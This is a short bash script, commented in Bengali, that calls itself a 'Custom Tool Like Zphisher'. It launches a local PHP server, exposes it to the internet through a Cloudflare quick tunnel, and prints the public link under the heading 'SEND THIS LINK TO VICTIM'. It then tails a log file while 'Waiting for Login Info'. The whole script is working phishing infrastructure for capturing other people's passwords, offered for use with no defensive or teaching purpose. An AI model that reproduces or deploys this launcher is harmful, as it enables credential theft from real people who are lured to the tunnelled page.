#!/bin/bash

# কালার কোড
red='\e[1;31m'
green='\e[1;32m'
blue='\e[1;34m'
reset='\e[0m'

clear
echo -e "${blue}  ____  _     _     _               ${reset}"
echo -e "${blue} |  _ \| |__ (_)___| |__   ___ _ __ ${reset}"
echo -e "${blue} | |_) | '_ \| / __| '_ \ / _ \ '__|${reset}"
echo -e "${blue} |  __/| | | | \__ \ | | |  __/ |   ${reset}"
echo -e "${blue} |_|   |_| |_|_|___/_| |_|\___|_|   ${reset}"
echo -e "       Custom Tool Like Zphisher\n"

# ১. আগের প্রসেস কিল করা
killall php 2>/dev/null

# ২. সার্ভার চালু করা
echo -e "${green}[*] Starting PHP Server on port 8080...${reset}"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2

# ৩. ক্লাউডফ্লেয়ার টানেল চালু করা
echo -e "${green}[*] Starting Cloudflared Tunnel...${reset}"
cloudflared tunnel --url http://127.0.0.1:8080 > link.log 2>&1 &
sleep 5

# ৪. লিঙ্ক বের করে আনা
link=$(grep -o 'https://[-0-9a-z.]*.trycloudflare.com' link.log)
echo -e "\n${blue}------------------------------------------${reset}"
echo -e "${green}  SEND THIS LINK TO VICTIM:${reset} $link"
echo -e "${blue}------------------------------------------${reset}"

# ৫. পাসওয়ার্ড চেক করা
echo -e "\n${red}[!] Waiting for Login Info...${reset}\n"
tail -f log.txt
